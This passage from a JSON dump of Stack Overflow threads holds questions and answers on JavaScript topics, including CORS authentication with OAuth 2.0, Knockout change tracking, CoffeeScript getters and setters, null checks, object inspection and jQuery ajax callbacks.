                    "score": 0
                },
                {
                    "body": "<p>Not an answer running for the prize. Just my 2 cents :)</p>\n\n<p>On my web server, </p>\n\n<p>I do my authentication through a rest call with login/password with basic authentication over https. This call delivers a key to the client (a one page web app).</p>\n\n<p>Then every subsequent REST call is signed with the key. The server checks that the signature is correct and everything still happen in https.</p>\n\n<p>This mechanism is quite used I believe.</p>\n\n<p>I don't see the issue with cross domain. I have a single source anf if I need something from another source, I'd use JSONP.</p>\n\n<p>I use nginx as an https->http forwarder.</p>\n\n<p>Not sure how it competes with an OAuth2 solution.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I very similar idea using vinilla js web app and cross domain authentication to GAE backend or OpenID connect.</p>\n\n<p>The web app is run on CDN. When click login link, it goes to respective login server and redirect back to the web app (with XSRF security token and HTTPS only cookie). Login server accept cross domain request <a href=\"https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS#Requests_with_credentials\" rel=\"nofollow\">with credentials</a>. XSRF token has to be set (in header) with every request. cookie is set by the browser. Since it is HTTP only cookie, JS cannot read it. The technique is very secure.   </p>\n\n<p>Once login, you can get secure assess from login server. </p>\n\n<p>For detail description, you can find <a href=\"http://dev.yathit.com/auth/ydn-login-client.html\" rel=\"nofollow\">here</a> and open source <a href=\"https://bitbucket.org/ytkyaw/ydn-auth/wiki/Home\" rel=\"nofollow\">repo</a> here.  </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I'm working on an app with a pretty similar architecture though the services are .NET Web API rather than Node and we're using <a href=\"http://dotnetopenauth.net/\" rel=\"nofollow\">DotNetOpenAuth</a> for the OAuth provider.   Rather than the hybrid approach you're suggesting we're doing the following:</p>\n\n<ol>\n<li>x.com serves up a login page </li>\n<li>login page POSTs back credentials to x.com </li>\n<li>server side logic at x.com combines client_id and client_secret with the credentials to submit a token request (<a href=\"http://tools.ietf.org/html/rfc6749#section-4.3\" rel=\"nofollow\">resource owner password credentials grant</a> that you've\nmentioned above) receiving back both a temporary access token and a\nrefresh token</li>\n<li>the refresh token is encrypted into a cookie issued by x.com</li>\n<li>both the cookie (with encrypted refresh token) and the temporary access token are then sent to the browser</li>\n<li>the client app (angular in my case) can now use the access token to hit api.x.com for services  (It appears you're well aware of the limitations of CORS...  we hacked a version of angular's <a href=\"http://docs.angularjs.org/api/ngResource.%24resource\" rel=\"nofollow\">$resource</a> to facilitate this but it wasn't pretty since we wanted to use all HTTP verbs and support IE9) </li>\n<li>when the access token expires, the client side app can request a new access token from x.com </li>\n<li>server-side, x.com decrypts the cookie to get at the refresh token and issues another oauth call for a new access token</li>\n</ol>\n\n<p>This is fairly high-level but hopefully gives you a sense for how to tackle your situation.  In my case, and it appears in yours, we didn't want to use session state or a database to store the refresh token but obviously exposing that to the browser introduces security concerns so the encryption of the refresh token is important (among other security considerations) and the use of the cookie eliminates the need for session state or other persistent storage on x.com.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I've built this example using Node and PassportJS to show how to authenticate the users with Facebook or Local Strategy. Both sides are on different domains as you described and it requires CORS enabled.</p>\n\n<p>GitHub: <a href=\"https://github.com/pablodenadai/Corsnection\" rel=\"nofollow\">https://github.com/pablodenadai/Corsnection</a><br>\nLive demo: <a href=\"http://corsnection-client.herokuapp.com/\" rel=\"nofollow\">http://corsnection-client.herokuapp.com/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<h2>The Problem:</h2>\n\n<p>Serving a secure API to a client side app using only a local authentication strategy. <br> <em>The red arrows are part of the knowledge gap.</em></p>\n\n<p><img src=\"http://i.stack.imgur.com/7MMrm.png\" alt=\"enter image description here\"></p>\n\n<h2>Context:</h2>\n\n<p>That is --- <code>client.example.com</code> is making a <strong>POST</strong> to <code>api.example.com/login</code> where on success <code>client.example.com</code> can gain access to a <strong>GET</strong> service like <code>api.example.com/secret</code>.</p>\n\n<h2>An idea!</h2>\n\n<p>Implimentation of OAuth 2.0 with hybrid grant type sitting in front of API. </p>\n\n<p><em><strong>Why hybrid?</em></strong> </p>\n\n<ul>\n<li><p>It wouldn't be an <code>Implicit Grant Flow</code> aka <code>Client-Side Web Applications Flow</code> because there is no redirection to API server too grant access token. (i.e.) <em>\"Is it ok for so-and-so to access your data?\"</em></p></li>\n<li><p>It wouldn't be a <code>Resource Owner Password Flow</code> because a <em>Client ID and Client Secret</em> are passed along with the request so it's assumed the client app is server-side.</p></li>\n</ul>\n\n<p><em>OK... so what about a little bit of both?</em></p>\n\n<p>What if we used a CRSF token on page load of client-side app, and POST it with user credentials too OAuth 2.0 authentication endpoint to exchange for access token? You would authenticate each subsequent request with the access token and CRSF token after a successful login.</p>\n\n<p><strong>A good Node.js OAuth 2.0 library I found:</strong></p>\n\n<p><a href=\"https://github.com/ammmir/node-oauth2-provider\">https://github.com/ammmir/node-oauth2-provider</a></p>\n\n<h2>Help Me!</h2>\n\n<p>I can not find a working example of an authentication measure that solves this problem! Point me in the right direction? </p>\n\n<blockquote>\n  <p>Ultimately, the goal here is too authenticate a client side app to a REST api using CORS with a local strategy --- i.e. username &amp; password --- even if the convention above isn't possible.</p>\n</blockquote>\n\n<h2>To Accommodate Bounty:</h2>\n\n<p><em>This is a client side app, so let's stay trendy.</em> </p>\n\n<p>I'm looking for a working example using the <strong>Node.js</strong> OAuth 2.0 seed above for the API/Auth server and a front end framework like <strong>Angular.js</strong> or <strong>Backbone.js</strong> to make requests.</p>\n\n<p><em>The example should match the context described above.</em></p>\n",
            "last_activity_date": 1374233093,
            "question_id": 15286324,
            "score": 34,
            "tags": [
                "javascript",
                "node.js",
                "angularjs"
            ],
            "title": "Authenticate client-side app to REST API using CORS with local strategy"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>You can subscribe to the properties that you want to monitor:</p>\n\n<pre><code>myViewModel.personName.subscribe(function(newValue) {\n    alert(\"The person's new name is \" + newValue); \n});\n</code></pre>\n\n<p>This will alert when personName changes.</p>\n\n<p>Ok, so you want to know when anything changes in your model...</p>\n\n<pre><code>var viewModel = \u2026 // define your viewModel\n\nvar changeLog = new Array();  \n\nfunction catchChanges(property, value){\n    changeLog.push({property: property, value: value});\n    viewModel.isDirty = true;\n}\n\nfunction initialiseViewModel()\n{\n    // loop through all the properties in the model\n    for (var property in viewModel) {\n\n        if (viewModel.hasOwnProperty(property)) { \n\n            // if they're observable\n            if(viewModel[property].subscribe){\n\n                // subscribe to changes\n                viewModel[property].subscribe(function(value) {\n                    catchChanges(property, value);\n                });\n            }\n        }\n    }\n    viewModel.isDirty = false;\n}\n\nfunction resetViewModel() {\n    changeLog = new Array();  \n    viewModel.isDirty = false;\n}\n</code></pre>\n\n<p><em>(haven't tested it - but you should get the idea)</em></p>\n",
                    "is_accepted": false,
                    "score": 33
                },
                {
                    "body": "<p>Use extenders:</p>\n\n<pre><code>ko.extenders.trackChange = function (target, track) {\n    if (track) {\n        target.isDirty = ko.observable(false);\n        target.originalValue = target();\n        target.subscribe(function (newValue) {\n            // use != not !== so numbers will equate naturally\n            target.isDirty(newValue != target.originalValue);\n        });\n    }\n    return target;\n};\n</code></pre>\n\n<p>Then: </p>\n\n<pre><code>self.MyProperty= ko.observable(\"Property Value\").extend({ trackChange: true });\n</code></pre>\n\n<p>Now you can inspect like this:</p>\n\n<pre><code>self.MyProperty.isDirty()\n</code></pre>\n\n<p>You can also write some generic viewModel traversing to see if anything's changed:</p>\n\n<pre><code>    self.isDirty = ko.computed(function () {\n    for (key in self) {\n        if (self.hasOwnProperty(key) &amp;&amp; ko.isObservable(self[key]) &amp;&amp; typeof self[key].isDirty === 'function' &amp;&amp; self[key].isDirty()) {\n            return true;\n        }\n    }\n});\n</code></pre>\n\n<p>... and then just check at the viewModel level</p>\n\n<pre><code>self.isDirty()\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 59
                },
                {
                    "body": "<p>I had the same problem, i needed to observe any change on the viewModel, in order to send the data back to the server, \nIf anyone still intersted, i did some research and this is the best solution iv'e managed to assemble:</p>\n\n<pre><code>function GlobalObserver(viewModel, callback) {  \n    var self = this;\n    viewModel.allChangesObserver = ko.computed(function() {\n        self.viewModelRaw = ko.mapping.toJS(viewModel);\n    });\n    viewModel.allChangesObserver.subscribe(function() {\n        callback(self.viewModelRaw);\n    });\n    self.dispose = function() {\n        if (viewModel.allChangesObserver)\n            viewModel.allChangesObserver.dispose();\n        delete viewModel.allChangesObserver;\n    };\n};\n</code></pre>\n\n<p>in order to use this 'global observer':</p>\n\n<pre><code>function updateEntireViewModel() {\n    var rawViewModel = Ajax_GetItemEntity(); //fetch the json object..    \n    //enter validation code here, to ensure entity is correct.\n    if (koGlobalObserver)\n        koGlobalObserver.dispose(); //If already observing the older ViewModel, stop doing that!\n    var viewModel = ko.mapping.fromJS(rawViewModel);        \n    koGlobalObserver = new GlobalObserver(viewModel, Ajax_Submit);\n    ko.applyBindings(viewModel [ ,optional dom element]);   \n}\n</code></pre>\n\n<p>Note that the callback given (in this case 'Ajax_Submit') will be fired on ANY change that occurs on the view model, so i think it's really recommended to make some sort of delay mechanism to send the entity only when the user finished to edit the properties:</p>\n\n<pre><code>var _entitiesUpdateTimers = {};\n\nfunction Ajax_Submit(entity) { \n    var key = entity.ID; //or whatever uniquely related to the current view model..\n    if (typeof _entitiesUpdateTimers[key] !== 'undefined')\n        clearTimeout(_entitiesUpdateTimers[key]);    \n    _entitiesUpdateTimers[key] = \n        setTimeout(function() { SendEntityFunction(entity); }, 500);           \n}\n</code></pre>\n\n<p>I'm new to JavaScript and the knockout framework, (only yestarday i started to work with this wonderfull framework), so don't get mad at me if i did something wrong.. (-:</p>\n\n<p>Hope this helps!</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You might use the plugin below for this:</p>\n\n<p><a href=\"https://github.com/ZiadJ/knockoutjs-reactor\" rel=\"nofollow\">https://github.com/ZiadJ/knockoutjs-reactor</a></p>\n\n<p>The code for example will allow you to keep track of all changes within any viewModel:</p>\n\n<pre><code>ko.watch(someViewModel, { depth: -1 }, function(parents, child) { \n    alert('New value is: ' + child());\n});\n</code></pre>\n\n<p>PS: As of now this will not work with subscribables nested within an array but a new version that supports it is on the way.</p>\n\n<p><strong>Update:</strong> The sample code was upgraded to work with v1.2b which adds support for array items and subscribable-in-subscribable properties.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I've adapted @Brett Green code and extended it so that we can have AcceptChanges, marking the model as not dirty plus having a nicer way of marking models as trackables. Here is the code:</p>\n\n<pre><code>var viewModel = {\n    name: ko.observable()   \n};\n\nko.track(viewModel);\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/david_freire/3HZEu/2/\" rel=\"nofollow\">http://jsfiddle.net/david_freire/3HZEu/2/</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I did this by taking a snapshot of the view model when the page loads, and then later comparing that snapshot to the current view model.  I didn't care what properties changed, only if any changed.</p>\n\n<p>Take a snapshot:</p>\n\n<pre><code>var originalViewModel = JSON.stringify(ko.toJS(viewModel));\n</code></pre>\n\n<p>Compare later:</p>\n\n<pre><code>if(originalViewModel != JSON.stringify(ko.toJS(viewModel))){\n    // Something has changed, but we don't know what\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Sure this is a very easy question to answer but is there an easy way to determine if any property of a knockout view model has changed?  </p>\n",
            "last_activity_date": 1409073114,
            "question_id": 10622707,
            "score": 31,
            "tags": [
                "javascript",
                "knockout.js"
            ],
            "title": "Detecting change to Knockout view model"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can use Object.defineProperty on straight JSON objects as well. </p>\n\n<pre><code>obj = {}\nObject.defineProperty obj, 'foo',\n    get: -&gt;\n        return 'bar'\n</code></pre>\n\n<p>The get/set notation does not work for various reasons in CoffeeScript. The biggest being that it is a <strong>whitespace-significant language</strong> and the compiler has not been built to account for get/set notation (at least to my knowledge).</p>\n\n<p>Note that get/set is not supported by all browsers (specifically, IE). Also note that the new ECMA standards (ECMAScript5) mentions Object.defineProperty as the way to define properties with getters/setters.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>No, not for now :(</p>\n\n<p>From the <a href=\"https://github.com/jashkenas/coffee-script/wiki/FAQ\">CoffeeScript FAQ</a>:</p>\n\n<blockquote>\n  <p>Q: Will you add feature X where feature X depends on a platform? </p>\n  \n  <p>A: No, implementation-specific features are not allowed as a policy. Everything that you write in CoffeeScript should be supported and runnable on any current JavaScript implementation (in practice, this means the lowest common denominator is IE6). Thus, features such as the following will not be implemented: getters &amp; setters, yield. </p>\n</blockquote>\n\n<p>Some GitHub issues about getter &amp; setter syntax: <a href=\"https://github.com/jashkenas/coffee-script/issues/64\">#64</a>, <a href=\"https://github.com/jashkenas/coffee-script/issues/451\">#451</a>, <a href=\"https://github.com/jashkenas/coffee-script/issues/1165/\">#1165</a> (there is some nice discussion in the last one). </p>\n\n<p>I personally think that having getter &amp; setter literal syntax would be a nice opt-in feature for CoffeeScript now that <code>defineProperty</code> is <a href=\"http://ecma-international.org/ecma-262/5.1/\">part of the ECMAScript standard</a>. The need for getters &amp; setters in JavaScript can be questionable, but you're not forced to use them just because they exist. </p>\n\n<hr>\n\n<p>Anyway, as you noticed, it's not that hard to implement a convenient wrapper function that calls <code>Object.defineProperty</code> for class declarations. I personally would use the approach suggested in <a href=\"https://github.com/jashkenas/coffee-script/issues/451#issuecomment-2404226\">here</a>:</p>\n\n<pre><code>Function::property = (prop, desc) -&gt;\n  Object.defineProperty @prototype, prop, desc\n\nclass Person\n  constructor: (@firstName, @lastName) -&gt;\n  @property 'fullName',\n    get: -&gt; \"#{@firstName} #{@lastName}\"\n    set: (name) -&gt; [@firstName, @lastName] = name.split ' '\n\np = new Person 'Robert', 'Paulson'\nconsole.log p.fullName # Robert Paulson\np.fullName = 'Space Monkey'\nconsole.log p.lastName # Monkey\n</code></pre>\n\n<p>Or, maybe create two different methods:</p>\n\n<pre><code>Function::getter = (prop, get) -&gt;\n  Object.defineProperty @prototype, prop, {get, configurable: yes}\n\nFunction::setter = (prop, set) -&gt;\n  Object.defineProperty @prototype, prop, {set, configurable: yes}\n\nclass Person\n  constructor: (@firstName, @lastName) -&gt;\n  @getter 'fullName', -&gt; \"#{@firstName} #{@lastName}\"\n  @setter 'fullName', (name) -&gt; [@firstName, @lastName] = name.split ' '\n</code></pre>\n\n<p>For plain objects you can just use <code>Object.defineProperty</code> (or <a href=\"https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/defineProperties\"><code>Object.defineProperties</code></a> ;) ) on the object itself as <a href=\"http://stackoverflow.com/a/11587298/581845\">Jason proposed</a>. Maybe wrap that in a little function:</p>\n\n<pre><code>objectWithProperties = (obj) -&gt;\n  if obj.properties\n    Object.defineProperties obj, obj.properties\n    delete obj.properties\n  obj\n\nrectangle = objectWithProperties\n  width: 4\n  height: 3\n  properties:\n    area:\n      get: -&gt; @width * @height\n\nconsole.log rectangle.area # 12\nrectangle.width = 5\nconsole.log rectangle.area # 15\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 56
                },
                {
                    "body": "<p>Here's another approach for defining properties with getters and setters in CoffeeScript that maintains a relatively clean syntax without adding anything to the global Function prototype (which I'd rather not do):</p>\n\n<pre><code>class Person\n  constructor: (@firstName, @lastName) -&gt;\n  Object.defineProperties @prototype,\n    fullName:\n      get: -&gt; \"#{@firstName} #{@lastName}\"\n      set: (name) -&gt; [@firstName, @lastName] = name.split ' '\n\np = new Person 'Robert', 'Paulson'\nconsole.log p.fullName # Robert Paulson\np.fullName = 'Space Monkey'\nconsole.log p.lastName # Monkey\n</code></pre>\n\n<p>It works well with many properties. For example, here's a Rectangle class that is defined in terms of (x, y, width, height), but provides accessors for an alternative representation (x1, y1, x2, y2):</p>\n\n<pre><code>class Rectangle                                     \n  constructor: (@x, @y, @w, @h) -&gt;\n  Object.defineProperties @prototype,\n    x1:\n      get: -&gt; @x\n      set: (@x) -&gt;\n    x2:\n      get: -&gt; @x + @w\n      set: (x2) -&gt; @w = x2 - @x\n    y1:\n      get: -&gt; @y\n      set: (@y) -&gt;\n    y2:\n      get: -&gt; @y + @h\n      set: (y2) -&gt; @w = y2 - @y\n\nr = new Rectangle 5, 6, 10, 11\nconsole.log r.x2 # 15\n</code></pre>\n\n<p>Here's <a href=\"http://coffeescript.org/#try%3aclass%20Rectangle%0A%20%20constructor%3A%20%28%40x%2C%20%40y%2C%20%40w%2C%20%40h%29%20-%3E%0A%20%20Object.defineProperties%20%40prototype%2C%0A%20%20%20%20x1%3A%0A%20%20%20%20%20%20get%3A%20-%3E%20%40x%0A%20%20%20%20%20%20set%3A%20%28%40x%29%20-%3E%0A%20%20%20%20x2%3A%0A%20%20%20%20%20%20get%3A%20-%3E%20%40x%20%2B%20%40w%0A%20%20%20%20%20%20set%3A%20%28x2%29%20-%3E%20%40w%20%3D%20x2%20-%20%40x%0A%20%20%20%20y1%3A%0A%20%20%20%20%20%20get%3A%20-%3E%20%40y%0A%20%20%20%20%20%20set%3A%20%28%40y%29%20-%3E%0A%20%20%20%20y2%3A%0A%20%20%20%20%20%20get%3A%20-%3E%20%40y%20%2B%20%40h%0A%20%20%20%20%20%20set%3A%20%28y2%29%20-%3E%20%40w%20%3D%20y2%20-%20%40y%0A%0Ar%20%3D%20new%20Rectangle%205%2C%206%2C%2010%2C%2011%0Aconsole.log%20r.x2%20%23%2015\">the corresponding JavaScript code</a>. Enjoy!</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>Like @curran, I prefer not to modify <code>Function</code> prototype.\nHere it is what I did in one of my projects\u00a0:</p>\n\n<p>Define somewhere an utility function which for a given class returns 2 functions allowing you to easily add getters and setters on the prototype of the class:</p>\n\n<pre class=\"lang-coffee prettyprint-override\"><code>gs = (obj) -&gt;\n  getter: (propName, getterFunction) -&gt;\n    Object.defineProperty obj.prototype, propName, \n      get: getterFunction\n      configurable: true\n      enumerable: true\n  setter: (propName, setterFunction) -&gt;\n    Object.defineProperty obj.prototype, propName, \n      set: setterFunction\n      configurable: true\n      enumerable: true\n</code></pre>\n\n<p><strong>gs</strong> stands for <strong>g</strong>etter and <strong>s</strong>etter.</p>\n\n<p>Then, you build and import the two functions configured for your class : </p>\n\n<pre class=\"lang-coffee prettyprint-override\"><code>class Dog\n  { getter, setter } = gs @\n\n  constructor: (name, age) -&gt; \n    @_name = name\n    @_age = age\n\n  getter 'name', -&gt; @_name\n  setter 'name', (name) -&gt; @_name = name\n\n  getter 'age', -&gt; @_age\n  setter 'age', (age) -&gt; @_age = age\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>ECMAScript allows us to define getters or setters as following:</p>\n\n<p><em>[text/javascript]</em></p>\n\n<pre><code>var object = {\n  property: 7,\n  get getable() { return this.property + 1; },\n  set setable(x) { this.property = x / 2; }\n};\n</code></pre>\n\n<p>I can work around if I'm using a <em>class</em>:</p>\n\n<p><em>[text/coffeescript]</em></p>\n\n<pre><code>\"use strict\"\n\nFunction::trigger = (prop, getter, setter) -&gt;\n      Object.defineProperty @::,\n              get: getter\n              set: setter               \n\nclass Class\n      property: ''\n\n      @trigger 'getable', -&gt;\n               'x'\n\n      member: 0\n</code></pre>\n\n<p>But what if I want to define trigger on the <em>object directly</em> - <strong>without</strong> using <strong><code>defineProperty</code> / -<code>ies</code></strong>. I want to do something like (it's <em>not working</em> that way):</p>\n\n<p>[text/x-pseudo-coffeescript]</p>\n\n<pre><code>object =\n  property: 'xhr'\n  get getable: 'x'\n</code></pre>\n\n<p>It's working in JavaScript without any problems and I don't want my scripts to regress when I'm using CoffeeScript. Isn't there a way to <strong>do this as comfortable as in JavaScript</strong>/ECMAScript? Thanks.</p>\n",
            "last_activity_date": 1426019395,
            "question_id": 11587231,
            "score": 24,
            "tags": [
                "javascript",
                "oop",
                "coffeescript",
                "getter-setter",
                "ecmascript-5"
            ],
            "title": "CoffeeScript: Getter/Setter in Object Initializers"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>They are not equivalent. The first will execute the block following the <code>if</code> statement if <code>myVar</code> is <em>truthy</em> (i.e. evaluates to <code>true</code> in a conditional), while the second will execute the block if <code>myVar</code> is any value other than <code>null</code>.</p>\n\n<p>The only values that are not truthy in JavaScript are the following (a.k.a. <em>falsy</em> values):</p>\n\n<ul>\n<li><code>null</code></li>\n<li><code>undefined</code></li>\n<li><code>0</code></li>\n<li><code>\"\"</code> (the empty string)</li>\n<li><code>false</code></li>\n<li><code>NaN</code></li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 107
                },
                {
                    "body": "<p>Have a read at this post: <a href=\"http://enterprisejquery.com/2010/10/how-good-c-habits-can-encourage-bad-javascript-habits-part-2/\">http://enterprisejquery.com/2010/10/how-good-c-habits-can-encourage-bad-javascript-habits-part-2/</a></p>\n\n<p>It has some nice tips for JavaScript in general but one thing it does mention is that you should check for null like:</p>\n\n<pre><code>if(myvar) { }\n</code></pre>\n\n<p>It also mentions what's considered 'falsey' that you might not realise.</p>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>The two conditional statements you list here are not better than one another. Your usage depends on the situation. You have a typo by the way in the 2nd example. There should be only one equals sign after the exclamation mark.</p>\n\n<p>The 1st example determines if the value in <strong>myVar</strong> is true and executes the code inside of the <strong>{...}</strong></p>\n\n<p>The 2nd example evaluates if <strong>myVar</strong> does not equal null and if that case is true it will execute your code inside of the <strong>{...}</strong></p>\n\n<p>I suggest taking a look into conditional statements for more techniques. Once you are familiar with them, you can decide when you need them.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>how to test if a variable is not NULL === if (myVar !== null) {...}</p>\n\n<p>the block will be executed if myVar is not null.. it will be executed if myVar is undefined or false or 0 or NaN or anything else.. </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>look at this code </p>\n\n<p>// undefined instead of null   </p>\n\n<p>if(typeof var_Fname === 'undefined')\n {</p>\n\n<pre><code>// do something\n</code></pre>\n\n<p>};</p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>There is another possible scenario I have just come across.</p>\n\n<p>I did an ajax call and got data back as null. I had to check it like this:</p>\n\n<pre><code>if(value != 'null'){}\n</code></pre>\n\n<p>So, null was a string which read \"null\" rather than really being null.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>My understanding is the two JavaScript lines below are equivalent but I'm confused which is the best practice to use:</p>\n\n<p>Should I do:</p>\n\n<pre><code>if (myVar) {...}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>if (myVar !== null) {...}\n</code></pre>\n",
            "last_activity_date": 1413154609,
            "question_id": 4361585,
            "score": 61,
            "tags": [
                "javascript"
            ],
            "title": "JavaScript: how to test if a variable is not NULL"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<pre><code>var str = \"\";\nfor(var k in obj)\n    if (obj.hasOwnProperty(k)) //omit this test if you want to see built-in properties\n        str += k + \" = \" + obj[k] + \"\\n\";\nalert(str);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>The <code>for</code>-<code>in</code> loops for each property in an object or array. You can use this property to get to the value as well as change it.</p>\n\n<p><strong>Note:</strong> Private properties are not available for inspection, unless you use a \"spy\"; basically, you override the object and write some code which does a for-in loop inside the object's context.</p>\n\n<p>For in looks like:</p>\n\n<pre><code>for (var property in object) loop();\n</code></pre>\n\n<p>Some sample code:</p>\n\n<pre><code>function xinspect(o,i){\n    if(typeof i=='undefined')i='';\n    if(i.length&gt;50)return '[MAX ITERATIONS]';\n    var r=[];\n    for(var p in o){\n        var t=typeof o[p];\n        r.push(i+'\"'+p+'\" ('+t+') =&gt; '+(t=='object' ? 'object:'+xinspect(o[p],i+'  ') : o[p]+''));\n    }\n    return r.join(i+'\\n');\n}\n\n// example of use:\nalert(xinspect(document));\n</code></pre>\n\n<p><strong>Edit:</strong> Some time ago, I wrote my own inspector, if you're interested, I'm happy to share.</p>\n\n<p><strong>Edit 2:</strong> Well, I wrote one up anyway.</p>\n",
                    "is_accepted": true,
                    "score": 28
                },
                {
                    "body": "<p>How about <code>alert(JSON.stringify(object))</code> with a modern browser?</p>\n\n<p>In case of <code>TypeError: Converting circular structure to JSON</code>, here are more options: <a href=\"http://stackoverflow.com/questions/2303713/how-to-serialize-dom-node-to-json\">How to serialize DOM node to JSON?</a></p>\n\n<p>The documentation: <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify\"><code>JSON.stringify()</code></a> provides info on formatting or prettifying the output.</p>\n",
                    "is_accepted": false,
                    "score": 108
                },
                {
                    "body": "<p>Use console.dir(object) and the Firebug plugin</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>Use your console:</p>\n\n<pre><code>console.log(object);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>There are few methods : </p>\n\n<pre><code> 1. typeof tells you which one of the 6 javascript types is the object. \n 2. instanceof tells you if the object is an instance of another object.\n 3. List properties with for(var k in obj)\n 4. Object.getOwnPropertyNames( anObjectToInspect ) \n 5. Object.getPrototypeOf( anObject )\n 6. anObject.hasOwnProperty(aProperty) \n</code></pre>\n\n<p>In a console context, sometimes the .constructor or .prototype maybe useful: </p>\n\n<pre><code>console.log(anObject.constructor ); \nconsole.log(anObject.prototype ) ; \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>This is blatant rip-off of Christian's excellent answer. I've just made it a bit more readable:</p>\n\n<pre><code>/**\n * objectInspector digs through a Javascript object\n * to display all its properties\n *\n * @param object - a Javascript object to inspect\n * @param result - a string of properties with datatypes\n *\n * @return result - the concatenated description of all object properties\n */\nfunction objectInspector(object, result) {\n    if (typeof object != \"object\")\n        return \"Invalid object\";\n    if (typeof result == \"undefined\")\n        result = '';\n\n    if (result.length &gt; 50)\n        return \"[RECURSION TOO DEEP. ABORTING.]\";\n\n    var rows = [];\n    for (var property in object) {\n        var datatype = typeof object[property];\n\n        var tempDescription = result+'\"'+property+'\"';\n        tempDescription += ' ('+datatype+') =&gt; ';\n        if (datatype == \"object\")\n            tempDescription += 'object: '+objectInspector(object[property],result+'  ');\n        else\n            tempDescription += object[property];\n\n        rows.push(tempDescription);\n    }//Close for\n\n    return rows.join(result+\"\\n\");\n}//End objectInspector\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Here is my object inspector that is more readable. Because the code takes to long to write down here you can download it at <a href=\"http://etto-aa-js.googlecode.com/svn/trunk/inspector.js\" rel=\"nofollow\">http://etto-aa-js.googlecode.com/svn/trunk/inspector.js</a></p>\n\n<p>Use like this :</p>\n\n<pre><code>document.write(inspect(object));\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>How can I inspect an Object in an alert box? Normally alerting an Object just throws the nodename:</p>\n\n<pre><code>alert(document);\n</code></pre>\n\n<p>But I want to get the properties and methods of the object in the alert box. How can I achive this functionality if possible? Or any other suggestion?</p>\n\n<p>I am especially seeking a solution for a production environment where console.log or Firebug is not available.</p>\n",
            "last_activity_date": 1419989604,
            "question_id": 5357442,
            "score": 55,
            "tags": [
                "javascript",
                "object",
                "inspect"
            ],
            "title": "How to inspect Javascript Objects"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Like this...</p>\n\n<pre><code>function doSomething(url, elem) {\n  $.ajax({\n     type: \"GET\",\n     url: url,\n     dataType: \"xml\",\n     success: function(xml) {\n       rssToTarget(xml, elem);\n     }\n  });\n}\n</code></pre>\n\n<p>Answer to your comment: <a href=\"http://stackoverflow.com/questions/80802/does-use-of-anonymous-functions-affect-performance\">Does use of anonymous functions affect performance?</a></p>\n",
                    "is_accepted": true,
                    "score": 67
                },
                {
                    "body": "<p>The pattern you'd like to use could work if you create a <a href=\"http://www.javascriptkit.com/javatutors/closures.shtml\">closure</a> inside your rssToTarget function:</p>\n\n<pre><code>function rssToTarget(element) {\n  return function (xmlData) {\n    // work with element and the data returned from the server\n  }\n}\n\nfunction doSomething(url, elem) {\n    $.ajax({ type: \"GET\",\n         url: url,\n         dataType: \"xml\",\n         success: rssToTarget(elem)\n       });\n}\n</code></pre>\n\n<p>When <code>rssToTarget(elem)</code> is executed, the element parameter is stored in the <a href=\"http://www.javascriptkit.com/javatutors/closures.shtml\">closure</a>, and the callback function is returned, waiting to be executed.</p>\n",
                    "is_accepted": false,
                    "score": 18
                }
            ],
            "body": "<p>JavaScript code I'm starting with:  </p>\n\n<pre><code>function doSomething(url) {  \n  $.ajax({ type: \"GET\",  \n           url: url,  \n           dataType: \"xml\",  \n       success: rssToTarget  \n       });  \n}\n</code></pre>\n\n<p>Pattern I would like to use:</p>\n\n<pre><code>//where elem is the target that should receive new items via DOM (appendChild)\nfunction doSomething(url, elem) {\n    $.ajax({ type: \"GET\",\n         url: url,\n         dataType: \"xml\",\n     success: rssToTarget(elem)\n       });\n}\n</code></pre>\n\n<p>I don't think I can get the callback to work this way, right? What is the proper pattern? I don't want to use global variables necessarily to temporarily hold the elem or elem name.</p>\n",
            "last_activity_date": 1291965564,
            "question_id": 1194104,
            "score": 54,
            "tags": [
                "javascript",
                "jquery",
                "ajax",
                "callback"
            ],
            "title": "jQuery / Ajax - $.ajax() Passing Parameters to Callback - Good Pattern to Use?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
